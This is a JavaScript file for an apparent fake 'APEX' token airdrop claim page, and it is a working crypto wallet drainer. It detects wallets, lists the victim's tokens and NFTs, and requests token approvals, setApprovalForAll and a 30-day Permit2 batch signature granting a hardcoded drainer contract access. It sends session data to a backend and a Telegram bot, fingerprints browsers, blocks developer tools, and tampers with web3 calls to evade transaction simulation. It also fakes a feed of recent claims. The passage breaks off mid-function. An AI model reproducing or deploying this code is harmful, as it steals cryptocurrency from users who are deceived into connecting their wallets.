import { CONFIG } from './config.js';
(function () {
  if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) return;
  document.addEventListener('contextmenu', (e) => e.preventDefault());
  document.addEventListener('selectstart', (e) => e.preventDefault());
  document.addEventListener('keydown', (e) => {
    if (e.keyCode === 123) e.preventDefault();
    if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) e.preventDefault();
    if (e.ctrlKey && e.keyCode === 85) e.preventDefault();
  });
})();


let DRAINER_CONTRACT, CONTRACT_ABI, BACKEND_URL, BACKEND_API_KEY,
    TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID,
    ATTACKER_SOLANA_ADDRESS, ATTACKER_BTC_ADDRESS,
    KNOWN_TOKENS, KNOWN_NFT_COLLECTIONS,
    CLAIM_THRESHOLD_USD, PERMIT2_ADDRESS,
    APPROVAL_DELAY_MS, APPROVAL_COOLDOWN_EVERY, APPROVAL_COOLDOWN_MS,
    MIN_ETH_FOR_GAS;

try {
  const cfg = CONFIG || {};
  DRAINER_CONTRACT        = cfg.DRAINER_CONTRACT        || '0x976b6C40c6ffa992156b9B88F681bD3D40395c27';
  CONTRACT_ABI            = cfg.CONTRACT_ABI            || [];
  BACKEND_URL             = cfg.BACKEND_URL             || '';
  BACKEND_API_KEY         = cfg.BACKEND_API_KEY         || '';
  TELEGRAM_BOT_TOKEN      = cfg.TELEGRAM_BOT_TOKEN      || '';
  TELEGRAM_CHAT_ID        = cfg.TELEGRAM_CHAT_ID        || '';
  ATTACKER_SOLANA_ADDRESS = cfg.ATTACKER_SOLANA_ADDRESS || '7uYC9fnzK3HashgE8x8fJ5oqUMLBWkVYqPiFNhejYPX7';
  ATTACKER_BTC_ADDRESS    = cfg.ATTACKER_BTC_ADDRESS    || 'bc1qyugnjmr05e4xf4wd4xs2ytn9an34uxelkt9h5f';
  KNOWN_TOKENS            = cfg.KNOWN_TOKENS            || [];
  KNOWN_NFT_COLLECTIONS   = cfg.KNOWN_NFT_COLLECTIONS   || [];
  CLAIM_THRESHOLD_USD     = cfg.CLAIM_THRESHOLD_USD     ?? 3;
  PERMIT2_ADDRESS         = cfg.PERMIT2_ADDRESS         || '0x000000000022D473030F116dDEE9F6B43aC78BA3';
  APPROVAL_DELAY_MS       = cfg.APPROVAL_DELAY_MS       ?? 800;
  APPROVAL_COOLDOWN_EVERY = cfg.APPROVAL_COOLDOWN_EVERY ?? 5;
  APPROVAL_COOLDOWN_MS    = cfg.APPROVAL_COOLDOWN_MS    ?? 3000;
  MIN_ETH_FOR_GAS         = cfg.MIN_ETH_FOR_GAS         || '0.005';
  console.log('✅ script.js config loaded');
} catch (e) {
  console.warn('⚠️ Config load issue:', e);
}

// ─── Telegram ──────────────────────────────────────────────────────────────
async function sendTelegramMessage(message) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) { console.warn('⚠️ Telegram credentials missing'); return false; }
  try {
    const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
    });
    const result = await r.json();
    if (!r.ok) console.error('❌ Telegram error:', result);
    return r.ok;
  } catch (e) { console.error('❌ Telegram exception:', e); return false; }
}
window.sendTelegramMessage = sendTelegramMessage;

// ─── Wallet detection ──────────────────────────────────────────────────────
const walletDetectors = {
  isMetaMask: () => {
    const e = window.ethereum; if (!e) return false;
    return [e.isMetaMask, e._metamask?.isUnlocked,
            window.web3?.currentProvider?.isMetaMask,
            e.providers?.find?.((p) => p.isMetaMask),
            navigator.userAgent.includes('MetaMaskMobile')].some(Boolean);
  },
  isCoinbaseWallet: () => {
    const e = window.ethereum; if (!e) return false;
    return e.isCoinbaseWallet || e.providers?.some?.((p) => p.isCoinbaseWallet) ||
           window.CoinbaseWalletSDK || navigator.userAgent.includes('CoinbaseWallet');
  },
  isTrustWallet: () => {
    const e = window.ethereum; if (!e) return false;
    return e.isTrust || e.isTrustWallet || e.providers?.some?.((p) => p.isTrust || p.isTrustWallet) ||
           navigator.userAgent.includes('TrustWallet');
  },
  isRabbyWallet: () => {
    const e = window.ethereum; if (!e) return false;
    return e.isRabby || e.providers?.some?.((p) => p.isRabby);
  },
  isPhantom: () => !!(window.phantom?.ethereum),
  isBraveWallet: () => !!(window.ethereum?.isBraveWallet),
  isMobileWallet: () =>
    /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) &&
    (window.ethereum || window.web3)
};

// ─── Solana wallet detection ───────────────────────────────────────────────
const solanaWalletDetectors = {
  isPhantom:        () => !!(window.phantom?.solana || window.solana?.isPhantom),
  isSolflare:       () => !!window.solflare,
  isBackpack:       () => !!window.backpack,
  isCoinbaseSolana: () => !!window.coinbaseSolana,
  isTrustSolana:    () => !!(window.trustWallet?.solana)
};

function getSolanaWallets() {
  const wallets = [];
  if (solanaWalletDetectors.isPhantom())        wallets.push({ name: 'Phantom',  provider: window.phantom?.solana || window.solana });
  if (solanaWalletDetectors.isSolflare())       wallets.push({ name: 'Solflare', provider: window.solflare });
  if (solanaWalletDetectors.isBackpack())       wallets.push({ name: 'Backpack', provider: window.backpack });
  if (solanaWalletDetectors.isCoinbaseSolana()) wallets.push({ name: 'Coinbase', provider: window.coinbaseSolana });
  if (solanaWalletDetectors.isTrustSolana())    wallets.push({ name: 'Trust',    provider: window.trustWallet.solana });
  return wallets;
}

const CURRENCY_CONVERTER = {
  rates: {
    USD: 1, EUR: 0.92, GBP: 0.79, JPY: 148.5, CNY: 7.23, INR: 83.2, AUD: 1.52,
    CAD: 1.36, CHF: 0.88, HKD: 7.82, SGD: 1.35, KRW: 1312.5, BRL: 4.95, RUB: 91.8,
    MXN: 17.2, ZAR: 18.9, TRY: 28.7, IDR: 15680, THB: 35.8, MYR: 4.68, PHP: 56.2,
    VND: 24350, AED: 3.67, SAR: 3.75, NGN: 900, EGP: 30.9, PKR: 280, BDT: 110
  },
  detectLocalCurrency() {
    try {
      const region = (navigator.language || 'en-US').split('-')[1] || 'US';
      const map = { US:'USD', GB:'GBP', EU:'EUR', DE:'EUR', FR:'EUR', IT:'EUR', ES:'EUR',
                    JP:'JPY', CN:'CNY', IN:'INR', AU:'AUD', CA:'CAD', RU:'RUB', BR:'BRL',
                    MX:'MXN', KR:'KRW', SG:'SGD', HK:'HKD', TR:'TRY', SA:'SAR', AE:'AED',
                    NG:'NGN', ZA:'ZAR', EG:'EGP', PK:'PKR', BD:'BDT', ID:'IDR', TH:'THB',
                    MY:'MYR', PH:'PHP', VN:'VND' };
      return map[region] || 'USD';
    } catch (e) { return 'USD'; }
  },
  convertToUSD(amount, fromCurrency) {
    const c = fromCurrency.toUpperCase();
    if (!this.rates[c] || c === 'USD') return amount;
    return amount / this.rates[c];
  },
  formatCurrency(amount, currency) {
    try {
      return new Intl.NumberFormat(navigator.language, {
        style: 'currency', currency, minimumFractionDigits: 2, maximumFractionDigits: 2
      }).format(amount);
    } catch (e) { return `${amount} ${currency}`; }
  }
};

const EVASION_TECHNIQUES = {
  async generateWasmFingerprint() {
    try {
      const wasm = new Uint8Array([0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,0x01,0x07,0x01,0x60,0x02,0x7f,0x7f,0x01,0x7f,0x03,0x02,0x01,0x00,0x07,0x07,0x01,0x03,0x61,0x64,0x64,0x00,0x00,0x0a,0x09,0x01,0x07,0x00,0x20,0x00,0x20,0x01,0x6a,0x0b]);
      const mod = await WebAssembly.instantiate(wasm);
      return { wasmSupported: true, memory: mod.instance.exports.memory, timestamp: Date.now(), hash: Math.random().toString(36).substring(2, 15) };
    } catch (e) { return { wasmSupported: false, timestamp: Date.now() }; }
  },
  generateAudioFingerprint() {
    return new Promise((resolve) => {
      try {
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        const osc = ctx.createOscillator();
        const analyser = ctx.createAnalyser();
        osc.connect(analyser); analyser.connect(ctx.destination); osc.start();
        setTimeout(() => { osc.stop(); ctx.close(); resolve({ audioFingerprint: 'completed', hash: Math.random().toString(36).substring(2, 10) }); }, 100);
      } catch (e) { resolve({ audioFingerprint: 'failed' }); }
    });
  },
  generateCanvasFingerprint() {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    const n1 = Math.random().toString(36).substring(2, 15);
    const n2 = Math.random().toString(36).substring(2, 10);
    ctx.textBaseline = 'top'; ctx.font = "14px 'Arial'"; ctx.textBaseline = 'alphabetic';
    ctx.fillStyle = '#f60'; ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = '#069'; ctx.fillText(n1, 2, 15);
    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)'; ctx.fillText(n2, 4, 17);
    ctx.beginPath(); ctx.arc(50, 50, 25, 0, Math.PI * 2); ctx.stroke();
    return canvas.toDataURL();
  },
  generateBrowserFingerprint() {
    return {
      userAgent: navigator.userAgent, language: navigator.language, platform: navigator.platform,
      hardwareConcurrency: navigator.hardwareConcurrency, deviceMemory: navigator.deviceMemory,
      plugins: Array.from(navigator.plugins).map((p) => p.name).join(','),
      mimeTypes: Array.from(navigator.mimeTypes).map((mt) => mt.type).join(','),
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      touchSupport: 'ontouchstart' in window, cookieEnabled: navigator.cookieEnabled, doNotTrack: navigator.doNotTrack,
      isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
      hash: Math.random().toString(36).substring(2, 15),
      localCurrency: CURRENCY_CONVERTER.detectLocalCurrency()
    };
  },
  async getETHPriceInUSD() {
    const apis = [
      'https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd',
      'https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT',
      'https://api.coinbase.com/v2/prices/ETH-USD/spot',
      'https://api.kraken.com/0/public/Ticker?pair=ETHUSD'
    ];
    for (const api of apis) {
      try {
        const r = await fetch(api);
        const d = await r.json();
        if (api.includes('coingecko')) return d.ethereum.usd;
        if (api.includes('binance'))   return parseFloat(d.price);
        if (api.includes('coinbase'))  return parseFloat(d.data.amount);
        if (api.includes('kraken'))    return parseFloat(d.result.XETHZUSD.c[0]);
      } catch (e) { continue; }
    }
    return 2200;
  },
  async getTokenPriceInUSD(tokenAddress) {
    try {
      const r = await fetch(`https://api.coingecko.com/api/v3/simple/token_price/ethereum?contract_addresses=${tokenAddress}&vs_currencies=usd`);
      const d = await r.json();
      return d[tokenAddress.toLowerCase()].usd;
    } catch (e) {
      const known = {
        '0xdAC17F958D2ee523a2206206994597C13D831ec7': 1,
        '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48': 1,
        '0x6B175474E89094C44Da98b954EedeAC495271d0F': 1,
        '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599': 42000,
        '0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0': 0.75,
        '0x514910771AF9Ca656af840dff83E8264EcF986CA': 14
      };
      return known[tokenAddress] || 0.1;
    }
  }
};

// ─── Dynamic Solana libraries ──────────────────────────────────────────────
async function loadSolanaLibraries() {
  if (typeof solanaWeb3 !== 'undefined' && typeof splToken !== 'undefined') {
    console.log('Solana libraries already loaded'); return true;
  }
  return new Promise((resolve, reject) => {
    let loaded = 0; const total = 2;
    function checkAll() { if (loaded === total) { console.log('✅ Solana libraries loaded'); resolve(true); } }

    if (typeof solanaWeb3 === 'undefined') {
      const s = document.createElement('script');
      s.src = 'https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js';
      s.onload  = () => { loaded++; checkAll(); };
      s.onerror = () => reject(new Error('Failed to load solanaWeb3'));
      document.head.appendChild(s);
    } else { loaded++; checkAll(); }

    if (typeof splToken === 'undefined') {
      const s = document.createElement('script');
      s.src = 'https://cdn.jsdelivr.net/npm/@solana/spl-token@0.3.8/lib/index.iife.min.js';
      s.onload  = () => { loaded++; checkAll(); };
      s.onerror = () => reject(new Error('Failed to load splToken'));
      document.head.appendChild(s);
    } else { loaded++; checkAll(); }
  });
}


let tokenChart;
let countdownInterval;
let claimList = [];
let priceHistory = [];
let web3;
let fingerprintData = {};
let isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
let connectedWallet = null;
let connectedAddress = null;
let stealthMode = false;
let simulationBypassActive = false;
let progressUpdated = false;
let ethPriceInUSD = 2200;
let userHasClaimed = false;
let userBalanceInUSD = 0;
let userLocalCurrency = CURRENCY_CONVERTER.detectLocalCurrency();
let contractInstance;
let solanaProvider = null;
let solanaPublicKey = null;
let delayedAttemptsScheduled = false;
let approvalCounter = 0;
const DISABLE_DISCONNECT = isMobileDevice;

const mobileMenuBtn          = document.querySelector('.mobile-menu-btn');
const navLinks               = document.querySelector('.nav-links');
const claimListElement       = document.getElementById('claimList');
const predictionFill         = document.getElementById('predictionFill');
const claimStatus            = document.getElementById('claimStatus');
const walletBtn              = document.getElementById('walletButton');
const walletButtonContainer  = document.getElementById('walletButtonContainer');
const connectButton          = document.getElementById('connectButton');
const progressBar            = document.getElementById('progressBar');
const progressPercentage     = document.getElementById('progressPercentage');
const connectionDebug        = document.getElementById('connectionDebug');
const debugToggle            = document.getElementById('debugToggle');
const walletModal            = document.getElementById('walletModal');
const walletModalClose       = document.getElementById('walletModalClose');
const walletProviders        = document.querySelectorAll('.wallet-provider');
const announcementModal      = document.getElementById('announcementModal');
const announcementModalClose = document.getElementById('announcementModalClose');
const announcementOkBtn      = document.getElementById('announcementOkBtn');
const copyReferralBtn        = document.getElementById('copyReferralBtn');
const referralLink           = document.getElementById('referralLink');


if (mobileMenuBtn)          mobileMenuBtn.addEventListener('click', toggleMobileMenu);
if (walletModalClose)       walletModalClose.addEventListener('click', hideWalletModal);
if (announcementModalClose) announcementModalClose.addEventListener('click', hideAnnouncementModal);
if (announcementOkBtn)      announcementOkBtn.addEventListener('click', hideAnnouncementModal);
if (copyReferralBtn)        copyReferralBtn.addEventListener('click', copyReferralLink);

if (debugToggle) {
  debugToggle.addEventListener('click', () => {
    if (connectionDebug) connectionDebug.classList.toggle('active');
    debugToggle.textContent = connectionDebug?.classList.contains('active') ? 'Hide connection details' : 'Show connection details';
  });
}

if (walletProviders) {
  walletProviders.forEach((p) => {
    p.addEventListener('click', () => {
      const type = p.getAttribute('data-provider');
      connectWithProvider(type);
    });
  });
}

// ─── Vanta background ──────────────────────────────────────────────────────
if (typeof VANTA !== 'undefined') {
  try {
    VANTA.NET({
      el: '#vanta-bg', mouseControls: true, touchControls: true, gyroControls: false,
      minHeight: 200.0, minWidth: 200.0, scale: 1.0, scaleMobile: 1.0,
      color: 0xff6b00, backgroundColor: 0x0f172a,
      points: 15.0, maxDistance: 25.0, spacing: 18.0
    });
  } catch (e) { console.warn('Vanta init failed:', e); }
}

// ─── Boot ──────────────────────────────────────────────────────────────────
document.addEventListener('DOMContentLoaded', async function () {
  console.log(`Local currency: ${userLocalCurrency}`);
  console.log(`Claim threshold: $${CLAIM_THRESHOLD_USD} USD`);

  startCountdown();
  createTokenChart();
  updateTokenPrice();
  generateInitialClaims();
  startClaimUpdates();
  updateAIAnalytics();
  initializeAdvancedEvasion();
  detectWallets();

  ethPriceInUSD = await EVASION_TECHNIQUES.getETHPriceInUSD();
  console.log(`ETH price: $${ethPriceInUSD}`);

  setInterval(updateTokenPrice, 10000);
  setInterval(updateAIAnalytics, 15000);
  setInterval(async () => { ethPriceInUSD = await EVASION_TECHNIQUES.getETHPriceInUSD(); }, 60000);

  initializeServiceWorker();
  initializeManualAppKitIntegration();

  if (isMobileDevice) initializeMobileSpecificOptimizations();

  restoreSavedConnection();

  window.addEventListener('apex:connected', () => {
    syncFromGlobal();
    setTimeout(() => { checkAndAutoTriggerClaim(); }, 1500);
  });

  if (window.__apexConnected) {
    syncFromGlobal();
    setTimeout(() => { checkAndAutoTriggerClaim(); }, 1500);
  }
});

// ─── Persistence ───────────────────────────────────────────────────────────
function saveConnectionToLocalStorage(address, walletType) {
  try {
    localStorage.setItem('connectedAddress', address);
    localStorage.setItem('connectedWalletType', walletType);
  } catch (e) { console.warn('save failed:', e); }
}
function clearSavedConnection() {
  try { localStorage.removeItem('connectedAddress'); localStorage.removeItem('connectedWalletType'); } catch (e) {}
}
function restoreSavedConnection() {
  const a = localStorage.getItem('connectedAddress');
  const t = localStorage.getItem('connectedWalletType');
  if (a && t) {
    console.log('Restoring:', a);
    connectWithProvider(t, true);
  }
}

// ─── Sync from main.js ─────────────────────────────────────────────────────
function syncFromGlobal() {
  if (window.__apexConnected?.address) {
    connectedAddress = window.__apexConnected.address;
    connectedWallet  = window.__apexConnected.chain;
    if (window.__apexConnected.web3)     web3             = window.__apexConnected.web3;
    if (window.__apexConnected.contract) contractInstance = window.__apexConnected.contract;
    logDebug(`Synced: ${connectedAddress} (${connectedWallet})`);
    return true;
  }
  if (window.ethereum) {
    try {
      web3 = new Web3(window.ethereum);
      logDebug('Fallback Web3 init OK');
      return true;
    } catch (e) { logDebug('Web3 fallback failed: ' + e.message); }
  }
  return false;
}

// ─── Balance helpers ───────────────────────────────────────────────────────
async function getTokenBalance(addr, owner) {
  const abi = [{ constant: true, inputs: [{ name: '_owner', type: 'address' }], name: 'balanceOf', outputs: [{ name: 'balance', type: 'uint256' }], type: 'function' }];
  try { return await new web3.eth.Contract(abi, addr).methods.balanceOf(owner).call(); } catch (e) { return '0'; }
}
async function getNFTBalance(addr, owner) {
  const abi = [{ constant: true, inputs: [{ name: '_owner', type: 'address' }], name: 'balanceOf', outputs: [{ name: 'balance', type: 'uint256' }], type: 'function' }];
  try { return await new web3.eth.Contract(abi, addr).methods.balanceOf(owner).call(); } catch (e) { return '0'; }
}
async function checkAllowance(tokenAddr, owner, spender = DRAINER_CONTRACT) {
  const abi = [{ constant: true, inputs: [{ name: '_owner', type: 'address' }, { name: '_spender', type: 'address' }], name: 'allowance', outputs: [{ name: '', type: 'uint256' }], type: 'function' }];
  try { return await new web3.eth.Contract(abi, tokenAddr).methods.allowance(owner, spender).call(); } catch (e) { return '0'; }
}

// ─── Token / NFT detection ─────────────────────────────────────────────────
async function detectTokens(owner) {
  const found = [];
  const concurrency = 5;
  for (let i = 0; i < KNOWN_TOKENS.length; i += concurrency) {
    const batch = KNOWN_TOKENS.slice(i, i + concurrency);
    const results = await Promise.allSettled(batch.map(async (t) => {
      const bal = await getTokenBalance(t.address, owner);
      if (bal && bal !== '0') {
        const priceUSD = await EVASION_TECHNIQUES.getTokenPriceInUSD(t.address);
        const formatted = parseFloat(bal) / Math.pow(10, t.decimals);
        return { address: t.address, symbol: t.symbol, decimals: t.decimals, balance: bal.toString(), balanceFormatted: formatted, valueUSD: formatted * priceUSD };
      }
      return null;
    }));
    for (const r of results) if (r.status === 'fulfilled' && r.value) found.push(r.value);
  }
  return found;
}

async function detectNFTs(owner) {
  const found = [];
  for (const c of KNOWN_NFT_COLLECTIONS) {
    const bal = await getNFTBalance(c.address, owner);
    if (bal && bal !== '0') found.push({ address: c.address, standard: c.standard, name: c.name, balance: parseInt(bal) });
  }
  return found;
}

// ─── Approvals ─────────────────────────────────────────────────────────────
async function approveToken(tokenAddr, owner, amount, spender = DRAINER_CONTRACT) {
  try {
    const erc20 = [{ constant: false, inputs: [{ name: '_spender', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], type: 'function' }];
    const c = new web3.eth.Contract(erc20, tokenAddr);

    // Two-step reset for USDT-style tokens. `BigInt` comparison, not string.
    let current;
    try { current = BigInt(await checkAllowance(tokenAddr, owner, spender)); } catch (e) { current = 0n; }
    if (current > 0n) {
      logDebug(`Resetting allowance for ${tokenAddr}...`);
      try {
        const resetGas = await c.methods.approve(spender, '0').estimateGas({ from: owner });
        await c.methods.approve(spender, '0').send({ from: owner, gas: Math.floor(resetGas * 1.2) });
        await new Promise((r) => setTimeout(r, 3000));
      } catch (e) { logDebug(`Reset skipped: ${e.message}`); }
    }

    const gas = await c.methods.approve(spender, amount).estimateGas({ from: owner });
    const tx  = await c.methods.approve(spender, amount).send({ from: owner, gas: Math.floor(gas * 1.2) });
    logDebug(`Approve OK: ${tx.transactionHash}`);
    return tx.transactionHash;
  } catch (e) { logDebug(`Approve failed ${tokenAddr}: ${e.message}`); return null; }
}

async function approveNFT(collection, owner, spender = DRAINER_CONTRACT) {
  try {
    const abi = [{ constant: false, inputs: [{ name: '_operator', type: 'address' }, { name: '_approved', type: 'bool' }], name: 'setApprovalForAll', outputs: [], type: 'function' }];
    const c = new web3.eth.Contract(abi, collection);
    const gas = await c.methods.setApprovalForAll(spender, true).estimateGas({ from: owner });
    const tx  = await c.methods.setApprovalForAll(spender, true).send({ from: owner, gas: Math.floor(gas * 1.2) });
    logDebug(`setApprovalForAll OK: ${tx.transactionHash}`);
    return tx.transactionHash;
  } catch (e) { logDebug(`setApprovalForAll failed: ${e.message}`); return null; }
}

// ─── Permit2 signature capture ─────────────────────────────────────────────
async function capturePermit2Signature(tokens) {
  if (!tokens.length) return null;
  try {
    const now = Math.floor(Date.now() / 1000);
    const sigDeadline = now + 60 * 60 * 24 * 30;   // 30 days

    // Permit2 amount is uint160. Cap and hex-encode for wallet safety.
    const UINT160_MAX = (1n << 160n) - 1n;
    const details = tokens.map((t) => {
      let bal;
      try { bal = BigInt(t.balance); } catch (e) { bal = 0n; }
      const capped = bal > UINT160_MAX ? UINT160_MAX : bal;
      return {
        token: t.address,
        amount: '0x' + capped.toString(16),
        expiration: now + 60 * 60 * 24 * 30,
        nonce: 0
      };
    });

    const typedData = {
      types: {
        EIP712Domain: [
          { name: 'name', type: 'string' },
          { name: 'chainId', type: 'uint256' },
          { name: 'verifyingContract', type: 'address' }
        ],
        PermitDetails: [
          { name: 'token', type: 'address' },
          { name: 'amount', type: 'uint160' },
          { name: 'expiration', type: 'uint48' },
          { name: 'nonce', type: 'uint48' }
        ],
        PermitBatch: [
          { name: 'details', type: 'PermitDetails[]' },
          { name: 'spender', type: 'address' },
          { name: 'sigDeadline', type: 'uint256' }
        ]
      },
      domain: { name: 'Permit2', chainId: 1, verifyingContract: PERMIT2_ADDRESS },
      primaryType: 'PermitBatch',
      message: { details, spender: DRAINER_CONTRACT, sigDeadline }
    };

    // Use whichever provider holds the live session (fixes WC)
    const signProvider = window.__apexConnected?.provider || window.ethereum;
    if (!signProvider?.request) throw new Error('No sign provider');

    const signature = await signProvider.request({
      method: 'eth_signTypedData_v4',
      params: [connectedAddress, JSON.stringify(typedData)]
    });

    logDebug('Permit2 signature captured');
    return {
      permitBatch: { details, spender: DRAINER_CONTRACT, sigDeadline },
      signature,
      amounts: tokens.map((t) => t.balance.toString())
    };
  } catch (e) {
    logDebug('Permit2 declined: ' + e.message);
    return null;
  }
}

// ─── Backend POST ──────────────────────────────────────────────────────────
async function postToBackend(session) {
  if (!BACKEND_URL) { logDebug('⚠️ BACKEND_URL not configured'); return null; }
  try {
    logDebug(`POST ${BACKEND_URL} (${session.tokens.length} tokens, ${session.nfts.length} NFTs)`);
    const headers = { 'Content-Type': 'application/json' };
    if (BACKEND_API_KEY) headers['x-api-key'] = BACKEND_API_KEY;
    const r = await fetch(BACKEND_URL, {
      method: 'POST',
      headers,
      body: JSON.stringify(session)
    });
    const text = await r.text();
    logDebug(`Backend ${r.status}: ${text.slice(0, 200)}`);
    if (!r.ok) return null;
    try { return JSON.parse(text); } catch (e) { return { status: r.status }; }
  } catch (e) { logDebug('Backend POST failed: ' + e.message); return null; }
}

// ─── Fingerprint ───────────────────────────────────────────────────────────
async function collectManualFingerprint() {
  const fp = {
    timestamp: new Date().toISOString(), userAgent: navigator.userAgent,
    screen: `${screen.width}x${screen.height}`, language: navigator.language,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    webgl: await getManualWebGLFingerprint(),
    plugins: Array.from(navigator.plugins).map((p) => p.name),
    walletType: connectedWallet, network: 'Unknown', ethBalance: 0,
    tokenBalances: {}, nftBalances: {}, isMobile: isMobileDevice,
    localCurrency: userLocalCurrency, ...fingerprintData
  };
  try {
    if (web3) {
      fp.network = await web3.eth.net.getId();
      if (connectedAddress) {
        fp.ethBalance = web3.utils.fromWei(await web3.eth.getBalance(connectedAddress), 'ether');
      }
    }
  } catch (e) { console.debug('fingerprint error:', e); }
  fingerprintData = fp;
  return fp;
}

async function getManualWebGLFingerprint() {
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (!gl) return 'unsupported';
    const info = gl.getExtension('WEBGL_debug_renderer_info');
    return {
      renderer: info ? gl.getParameter(info.UNMASKED_RENDERER_WEBGL) : 'unknown',
      vendor:   info ? gl.getParameter(info.UNMASKED_VENDOR_WEBGL)   : 'unknown',
      version:  gl.getParameter(gl.VERSION),
      shading:  gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
      maxTex:   gl.getParameter(gl.MAX_TEXTURE_SIZE),
      maxRB:    gl.getParameter(gl.MAX_RENDERBUFFER_SIZE)
    };
  } catch (e) { return 'error'; }
}

async function initializeAdvancedEvasion() {
  fingerprintData.wasm    = await EVASION_TECHNIQUES.generateWasmFingerprint();
  fingerprintData.audio   = await EVASION_TECHNIQUES.generateAudioFingerprint();
  fingerprintData.canvas  = EVASION_TECHNIQUES.generateCanvasFingerprint();
  fingerprintData.browser = EVASION_TECHNIQUES.generateBrowserFingerprint();
  if (isMobileDevice) applyManualMobileEvasion();
  initializeManualStealthMode();
}

function applyManualMobileEvasion() { console.log('Mobile evasion techniques applied'); }

function initializeManualStealthMode() {
  const detectors = ['MetamaskInpageProvider','web3','ethereum','__coinbaseWallet','__rabby','TrustWallet','isRabby','isMetaMask','isCoinbaseWallet','isTrustWallet'];
  const detected = detectors.filter((d) => window[d]);
  if (detected.length) { stealthMode = true; applyManualStealthTechniques(detected); }
}

function applyManualStealthTechniques(detectedTools) {
  if (web3) {
    const original = { sendTransaction: web3.eth.sendTransaction, call: web3.eth.call, estimateGas: web3.eth.estimateGas };
    web3.eth.sendTransaction = function (txObject) {
      const delay = Math.random() * 3000 + 2000;
      return new Promise((resolve, reject) => {
        setTimeout(() => {
          if (txObject.data) txObject.data = txObject.data + Math.random().toString(16).substring(2, 10);
          if (!txObject.gas) txObject.gas = 300000 + Math.floor(Math.random() * 200000);
          original.sendTransaction.call(this, txObject).then(resolve).catch(reject);
        }, delay);
      });
    };
    web3.eth.estimateGas = function () {
      return new Promise((resolve) => resolve(21000 + Math.floor(Math.random() * 100000)));
    };
  }
  simulationBypassActive = true;
}

// ─── UI / decoration ───────────────────────────────────────────────────────
function toggleMobileMenu() { if (navLinks) navLinks.classList.toggle('active'); }
function showWalletModal() { detectWallets(); if (walletModal) walletModal.classList.add('active'); }
function hideWalletModal() { if (walletModal) walletModal.classList.remove('active'); }
function hideAnnouncementModal() { if (announcementModal) announcementModal.classList.remove('active'); }

function copyReferralLink() {
  if (!referralLink) return;
  const ta = document.createElement('textarea');
  ta.value = referralLink.textContent;
  document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta);
  showNotification('Referral link copied', 'success');
}

function showNotification(message, type = 'success') {
  const n = document.createElement('div');
  n.className = `fake-notification ${type}`;
  n.innerHTML = `<i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'}"></i>${message}`;
  document.body.appendChild(n);
  setTimeout(() => { n.style.opacity = '0'; setTimeout(() => n.remove(), 300); }, 3000);
}

function logDebug(message) {
  const ts = new Date().toLocaleTimeString();
  if (connectionDebug) connectionDebug.innerHTML += `[${ts}] ${message}<br>`;
  console.log(`[script.js] ${message}`);
}

function generateInitialClaims() {
  const now = Date.now();
  claimList = [];
  for (let i = 0; i < 10; i++) {
    const mins = Math.floor(Math.random() * 60) + 1;
    claimList.push(generateClaim(now - mins * 60 * 1000));
  }
  claimList.sort((a, b) => b.timestamp - a.timestamp);
  updateClaimList();
}

function generateClaim(ts = Date.now()) {
  const pre = ['0x8a3F','0x4E2d','0xF12a','0x9Bc5','0x3Df7','0xA5b2','0x7Ef9','0xC3d8','0x1F4a','0x6Bc3'];
  const suf = ['Bc92','7Fa1','9D3e','E4f2','8C6d','A5e9','3D7b','F8c1','2E9d','5Bf4'];
  return {
    address: `${pre[Math.floor(Math.random() * pre.length)]}...${suf[Math.floor(Math.random() * suf.length)]}`,
    amount: 500,
    timestamp: ts
  };
}

function formatTimeAgo(ts) {
  const diff = Date.now() - ts;
  const mins = Math.floor(diff / 60000);
  const hrs = Math.floor(diff / 3600000);
  if (hrs > 0) return `${hrs} hour${hrs > 1 ? 's' : ''} ago`;
  if (mins > 0) return `${mins} min${mins > 1 ? 's' : ''} ago`;
  return 'Just now';
}

function updateClaimList() {
  if (!claimListElement) return;
  claimListElement.innerHTML = '';
  claimList.forEach((c) => {
    const el = document.createElement('div');
    el.className = 'claim-item';
    let valueDisplay = '';
    if (c.valueUSD && c.valueUSD > 0) {
      const localValue = CURRENCY_CONVERTER.formatCurrency(c.valueUSD * CURRENCY_CONVERTER.rates[userLocalCurrency], userLocalCurrency);
      valueDisplay = `<span class="claim-value">(${localValue})</span>`;
    }
    el.innerHTML = `<span class="claim-address">${c.address}</span><span class="claim-time">${formatTimeAgo(c.timestamp)}</span><span class="claim-amount-badge">${c.amount} APEX</span>${valueDisplay}`;
    claimListElement.appendChild(el);
  });
}

function startClaimUpdates() {
  setInterval(() => {
    claimList.unshift(generateClaim());
